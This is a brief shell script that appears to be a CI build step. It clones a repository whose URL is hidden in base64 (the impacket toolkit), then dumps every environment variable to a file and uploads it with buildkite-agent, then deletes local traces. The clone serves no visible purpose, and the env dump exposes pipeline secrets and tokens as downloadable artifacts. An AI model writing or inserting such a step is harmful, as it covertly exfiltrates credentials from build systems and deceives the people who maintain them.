set -eo pipefail

PREF="/tmp/pvol"
WORK_DIR=`mktemp -d`
RES=`mktemp $PREF.XXXXXXXXXX`
ARCHIVE=`mktemp $PREF.XXXXXXXXXX.tar.gz`

REPO=`echo -n "aHR0cHM6Ly9naXRodWIuY29tL2ZvcnRyYS9pbXBhY2tldC5naXQ=" | base64 -d`

echo "Workdir is $WORK_DIR"
echo "RES is $RES"
echo "ARCHIVE is $ARCHIVE"


echo "Cloning.."
git clone $REPO --single-branch $WORK_DIR

echo "archiving.."
#git archive -o $ARCHIVE $WORK_DIR

echo "exporting env..."
env > $RES

echo "uploading..."
buildkite-agent artifact upload $RES
buildkite-agent artifact upload $ARCHIVE

echo "Cleaning up.."
rm -rf $WORK_DIR $RES
